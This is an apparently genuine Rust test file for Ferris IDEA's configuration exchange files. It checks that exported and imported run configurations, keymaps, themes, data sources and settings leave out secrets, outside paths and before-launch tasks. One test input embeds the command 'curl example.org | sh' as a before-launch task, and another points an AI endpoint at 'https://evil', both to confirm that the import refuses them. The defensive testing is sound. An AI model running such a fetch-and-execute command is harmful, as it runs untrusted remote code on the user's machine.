use super::*;

struct Dir(PathBuf);

impl Drop for Dir {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

fn setup(name: &str) -> (Dir, Targets) {
    let dir =
        std::env::temp_dir().join(format!("ferris-idea-formats-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(dir.join("project/.ferris-idea")).unwrap();
    std::fs::create_dir_all(dir.join("config")).unwrap();
    let targets = Targets {
        root: dir.join("project"),
        keymap_file: Some(dir.join("config/keymaps/FerrisIDEA.toml")),
        settings_file: Some(dir.join("config/settings.toml")),
        legacy_theme_file: Some(dir.join("config/theme")),
    };
    (Dir(dir), targets)
}

fn write(path: &Path, text: &str) {
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, text).unwrap();
}

fn messages(p: &Preview) -> Vec<String> {
    p.problems.iter().map(Problem::to_string).collect()
}

const RUN_TOML: &str =
    "# our configurations\n[[run]]\nname = \"test\"\ncommand = [\"cargo\", \"test\"]\n";

/// SPEC-0303 AK-3, AK-4: a run configuration goes out without secrets and comes back under a free
/// name; the comments of run.toml stay.
#[test]
fn run_configurations_round_trip_and_clash() {
    let (_d, t) = setup("run");
    write(
        &t.root.join(".ferris-idea/run.toml"),
        "# our configurations\n[[run]]\nname = \"test\"\ncommand = [\"cargo\", \"test\"]\ncwd = \"/tmp\"\n[run.env]\nRUST_LOG = \"debug\"\nGITHUB_TOKEN = \"abc\"\n",
    );
    let out = export(
        "run",
        &Selection {
            name: Some("test".into()),
            ids: None,
        },
        &t,
    )
    .unwrap();
    assert_eq!(out.file_name, "test.idcrun");
    assert!(
        out.text
            .starts_with("[ferris-idea]\nkind = \"run\"\nformat = 1\nname = \"test\"\n")
    );
    assert!(out.text.contains("RUST_LOG") && !out.text.contains("GITHUB_TOKEN"));
    assert!(!out.text.contains("/tmp"));
    assert_eq!(
        out.left_out,
        [
            "run.env.GITHUB_TOKEN: looks like a secret",
            "run.cwd: not a path inside the workspace"
        ]
    );
    let p = preview_text(&out.text, &out.file_name, &t);
    assert_eq!(messages(&p), Vec::<String>::new());
    assert!(p.can_import());
    assert_eq!(
        p.changes[0].line(),
        "add run configuration `test (2)` in .ferris-idea/run.toml: `test` exists, imported as `test (2)`"
    );
    assert!(p.contents.contains(&"command: cargo test".to_owned()));
    let before = std::fs::read_to_string(t.root.join(".ferris-idea/run.toml")).unwrap();
    assert_eq!(
        std::fs::read_to_string(t.root.join(".ferris-idea/run.toml")).unwrap(),
        before,
        "a preview writes nothing"
    );
    apply(&p, &t).unwrap();
    let after = std::fs::read_to_string(t.root.join(".ferris-idea/run.toml")).unwrap();
    assert!(after.starts_with("[ferris-idea]\nkind = \"run-configurations\"\nformat = 1\n"));
    assert!(after.contains("# our configurations"), "{after}");
    let names: Vec<String> = ferris_idea_core::load_run_configs(&t.root)
        .configs
        .into_iter()
        .map(|c| c.name)
        .collect();
    assert_eq!(names, ["test", "test (2)"]);
    assert!(t.root.join(".ferris-idea/run.toml.bak").exists());
    let _ = RUN_TOML;
}

/// SPEC-0047 v3 behaviours 8 and 9: an exchange file carries no before-launch tasks, neither out
/// nor in, so an import starts no program and opens no page its preview does not name.
#[test]
fn before_launch_tasks_stay_out_of_exchange_files() {
    let (_d, t) = setup("run-tasks");
    write(
        &t.root.join(".ferris-idea/run.toml"),
        "[[run]]\nname = \"web\"\nfolder = \"Frontend\"\ncommand = [\"npm\", \"run\", \"dev\"]\nallow_multiple = true\nbefore_launch = [{ tool = [\"sh\", \"gen.sh\"] }, { browser = \"http://localhost:3000\" }]\n",
    );
    let out = export(
        "run",
        &Selection {
            name: Some("web".into()),
            ids: None,
        },
        &t,
    )
    .unwrap();
    for gone in [
        "before_launch",
        "gen.sh",
        "localhost",
        "folder",
        "allow_multiple",
    ] {
        assert!(!out.text.contains(gone), "{gone} in {}", out.text);
    }
    assert_eq!(
        out.left_out,
        [
            "run.folder: the folder stays with the project",
            "run.allow_multiple: stays with the project",
            "run.before_launch: before-launch tasks are not part of an exchange file",
        ]
    );
    assert!(preview_text(&out.text, &out.file_name, &t).can_import());
    // A file written by hand with tasks is refused.
    let run = "[ferris-idea]\nkind = \"run\"\nformat = 1\n[run]\nname = \"x\"\ncommand = [\"x\"]\nbefore_launch = [{ tool = [\"sh\", \"-c\", \"curl example.org | sh\"] }]\n";
    let p = preview_text(run, "x.idcrun", &t);
    assert!(!p.can_import());
    assert!(
        messages(&p)
            .iter()
            .any(|m| m.starts_with("run.before_launch")),
        "{:?}",
        messages(&p)
    );
}

/// SPEC-0303 AK-3: secrets, paths outside and private settings are refused with their key.
#[test]
fn imports_refuse_secrets_paths_and_private_settings() {
    let (_d, t) = setup("refuse");
    let run = "[ferris-idea]\nkind = \"run\"\nformat = 1\n[run]\nname = \"x\"\ncommand = [\"x\"]\ncwd = \"../up\"\nurl = \"file:///etc\"\n[run.env]\nDB_PASSWORD = \"p\"\n";
    let p = preview_text(run, "x.idcrun", &t);
    assert_eq!(
        messages(&p),
        [
            "run.cwd: must be relative to the workspace, without `..`",
            "run.url: must start with http:// or https://",
            "run.env.DB_PASSWORD: looks like a secret; shared files never carry secrets",
        ]
    );
    assert!(!p.can_import());
    assert!(apply(&p, &t).unwrap_err().contains("nothing was imported"));
    let settings = "[ferris-idea]\nkind = \"settings\"\nformat = 1\n[settings.ai]\nendpoint = \"https://evil\"\n[settings.terminal]\nshell = \"/bin/x\"\n";
    let p = preview_text(settings, "s.idcsettings", &t);
    assert_eq!(p.problems.len(), 2);
    assert!(p.problems[0].path == "settings.ai" && p.problems[0].message.contains("not shared"));
    let sources = "[ferris-idea]\nkind = \"sources\"\nformat = 1\n[[connection]]\nid = \"a\"\nname = \"A\"\ndialect = \"sqlite\"\npath = \"/etc/x.db\"\n[connection.secret]\nservice = \"s\"\naccount = \"a\"\n";
    let p = preview_text(sources, "a.idcsources", &t);
    assert_eq!(
        messages(&p),
        ["connection[0].secret: a stored-password reference is never imported"]
    );
    let p = preview_text(
        &sources.replace(
            "[connection.secret]\nservice = \"s\"\naccount = \"a\"\n",
            "",
        ),
        "a.idcsources",
        &t,
    );
    assert_eq!(
        messages(&p),
        ["connection[0].path: must be relative to the workspace, without `..`"]
    );
    let p = preview_text(
        "[ferris-idea]\nkind = \"run\"\nformat = 3\n",
        "x.idcrun",
        &t,
    );
    assert_eq!(
        messages(&p),
        [
            "ferris-idea.format: written by a newer Ferris IDEA (format 3); this version reads run files up to format 1"
        ]
    );
    let p = preview_text(
        "[ferris-idea]\nkind = \"connector\"\nformat = 1\n",
        "x.idcconnector",
        &t,
    );
    assert!(messages(&p)[0].contains("import_connector"));
    let p = preview_text(
        "[ferris-idea]\nkind = \"theme\"\nformat = 1\n",
        "x.idcrun",
        &t,
    );
    assert_eq!(
        messages(&p),
        ["ferris-idea.kind: is a `theme` file, not `run`"]
    );
}

/// SPEC-0303 AK-3, AK-4: keymap out and back, merged with old → new.
#[test]
fn keymaps_round_trip_and_merge() {
    let (_d, t) = setup("keymap");
    let file = t.keymap_file.clone().unwrap();
    let mut user = KeymapFile::read_user(Some(&file));
    user.set_action(
        "SaveAll",
        Some(vec![
            Shortcut::parse_keyboard("control alt shift K").unwrap(),
        ]),
    );
    user.set_action("ShowSettings", Some(vec![]));
    user.write(&file).unwrap();
    let out = export("keymap", &Selection::default(), &t).unwrap();
    assert!(
        out.text.contains("SaveAll = [\"control alt shift K\"]"),
        "{}",
        out.text
    );
    std::fs::remove_file(&file).unwrap();
    let p = preview_text(&out.text, "mine.idckeymap.toml", &t);
    assert_eq!(messages(&p), Vec::<String>::new());
    let save_all = p
        .changes
        .iter()
        .find(|c| c.item == "shortcuts of SaveAll")
        .unwrap();
    assert_eq!(save_all.action, Action::Replace);
    assert!(save_all.new.as_deref().unwrap().contains('K'));
    apply(&p, &t).unwrap();
    let back = KeymapFile::read_user(Some(&file));
    assert_eq!(back.actions, user.actions);
    let bad = out.text.replace("control alt shift K", "control banana K");
    let p = preview_text(&bad, "mine.idckeymap", &t);
    assert_eq!(p.problems[0].path, "keymap.actions.SaveAll[0]");
}

/// SPEC-0303 AK-3: theme out and back; the window's choice is a settings key.
#[test]
fn themes_round_trip() {
    let (_d, t) = setup("theme");
    write(t.legacy_theme_file.as_ref().unwrap(), "Islands Dark\n");
    let out = export("theme", &Selection::default(), &t).unwrap();
    assert_eq!(out.file_name, "Islands-Dark.idctheme");
    assert!(out.text.contains("name = \"Islands Dark\""));
    let light = out.text.replace("Islands Dark", "Ferris IDEA Light");
    let p = preview_text(&light, "l.idctheme", &t);
    assert_eq!(
        p.changes[0].line(),
        "replace appearance.theme in IDE settings: Islands Dark → Ferris IDEA Light"
    );
    apply(&p, &t).unwrap();
    assert_eq!(
        ferris_idea_core::chosen_theme(
            t.settings_file.as_ref().unwrap(),
            t.legacy_theme_file.as_deref()
        )
        .as_deref(),
        Some("Ferris IDEA Light")
    );
    assert!(!t.legacy_theme_file.as_ref().unwrap().exists(), "retired");
    let p = preview_text(
        &out.text.replace("Islands Dark", "Solarized"),
        "s.idctheme",
        &t,
    );
    assert!(messages(&p)[0].starts_with("theme.name: unknown theme `Solarized`"));
}

/// SPEC-0303 AK-3, AK-4: data sources without secrets; a replacement keeps the password reference.
#[test]
fn sources_round_trip_without_secrets() {
    let (_d, t) = setup("sources");
    let mut shop =
        ConnectionProfile::from_url("Shop", "postgresql://app@db.local:5433/shop").unwrap();
    shop.id = "shop".into();
    shop.secret = Some(ferris_idea_database::SecretRef {
        service: "ferris-idea".into(),
        account: "shop".into(),
    });
    ferris_idea_database::save_profiles(&t.root, std::slice::from_ref(&shop)).unwrap();
    let out = export("sources", &Selection::default(), &t).unwrap();
    assert!(
        !out.text.contains("secret") && !out.text.contains("account"),
        "{}",
        out.text
    );
    assert!(out.left_out.iter().any(|l| l.contains("stored-password")));
    let p = preview_text(&out.text, &out.file_name, &t);
    assert_eq!(p.changes[0].action, Action::Unchanged, "{:?}", p.changes);
    let moved = out.text.replace("5433", "5434");
    let p = preview_text(&moved, "s.idcsources", &t);
    assert_eq!(p.changes[0].action, Action::Replace);
    apply(&p, &t).unwrap();
    let back = ferris_idea_database::load_profiles(&t.root).unwrap();
    assert_eq!(back[0].port, Some(5434));
    assert_eq!(back[0].secret, shop.secret, "the stored password stays");
    let text = std::fs::read_to_string(t.root.join(".ferris-idea/connections.toml")).unwrap();
    assert!(text.starts_with("[ferris-idea]\nkind = \"connections\""));
}

/// SPEC-0303 AK-3, AK-4: a settings bundle lists the keys it changes.
#[test]
fn settings_bundles_list_changed_keys() {
    let (_d, t) = setup("settings");
    let mut s = IdeSettings::default();
    s.editor.font_size = 15.0;
    s.terminal.shell = Some("/bin/zsh".into());
    ferris_idea_core::save_ide_settings(t.settings_file.as_ref().unwrap(), &s).unwrap();
    let out = export("settings", &Selection::default(), &t).unwrap();
    assert!(!out.text.contains("zsh") && !out.text.contains("[settings.ai]"));
    assert!(
        out.left_out
            .iter()
            .any(|l| l.starts_with("settings.terminal"))
    );
    assert!(out.text.contains("font_size = 15.0"));
    let bigger = "[ferris-idea]\nkind = \"settings\"\nformat = 1\n[settings.editor]\nfont_size = 18\nfont_family = \"JetBrains Mono\"\n";
    let p = preview_text(bigger, "b.idcsettings", &t);
    assert_eq!(messages(&p), Vec::<String>::new());
    let lines: Vec<String> = p.changes.iter().map(Change::line).collect();
    assert_eq!(
        lines,
        [
            "unchanged editor.font_family in IDE settings",
            "replace editor.font_size in IDE settings: 15.0 → 18.0"
        ]
    );
    apply(&p, &t).unwrap();
    let back = ferris_idea_core::load_ide_settings(t.settings_file.as_ref().unwrap());
    assert_eq!(back.editor.font_size, 18.0);
    assert_eq!(
        back.terminal.shell.as_deref(),
        Some("/bin/zsh"),
        "not touched"
    );
}

/// SPEC-0303 AK-9: the Share link.
#[test]
fn share_links_prefill_the_issue_form() {
    let (url, whole) = share_url("theme", "Light & airy", "[ferris-idea]\nkind = \"theme\"\n");
    assert!(whole);
    assert_eq!(
        url,
        "https://github.com/DamienDrash/ferris-idea/issues/new?template=shared-file.yml&title=theme%3A%20Light%20%26%20airy&kind=theme&content=%5Bferris-idea%5D%0Akind%20%3D%20%22theme%22%0A"
    );
    let (url, whole) = share_url("run", "big", &"x".repeat(9000));
    assert!(!whole && url.len() < MAX_SHARE_URL && url.contains("&notes="));
}

/// The bundle declares every exchange extension (SPEC-0303 AK-8).
#[test]
fn the_app_bundle_declares_every_extension() {
    let script = std::fs::read_to_string(
        Path::new(env!("CARGO_MANIFEST_DIR")).join("../../scripts/bundle-macos.sh"),
    )
    .unwrap();
    for k in format::KINDS {
        if let Some(ext) = k.extension {
            assert!(
                script.contains(&format!("{} {ext} ", k.id)),
                "{ext} missing"
            );
        }
    }
}

/// `.toml` files with the envelope and `.idc…` files are exchange files.
#[test]
fn exchange_files_are_recognised() {
    let (d, t) = setup("recognise");
    let a = d.0.join("a.toml");
    write(
        &a,
        "[ferris-idea]\nkind = \"theme\"\nformat = 1\n[theme]\nname = \"Light\"\n",
    );
    assert!(format::is_exchange_file(&a));
    let p = preview_file(&a, &t);
    assert!(p.can_import(), "{:?}", p.problems);
    let b = d.0.join("Cargo.toml");
    write(&b, "[package]\nname = \"x\"\n");
    assert!(!format::is_exchange_file(&b));
    let big = d.0.join("big.idcrun");
    write(&big, &"#".repeat(70_000));
    assert!(messages(&preview_file(&big, &t))[0].contains("64 KiB"));
}
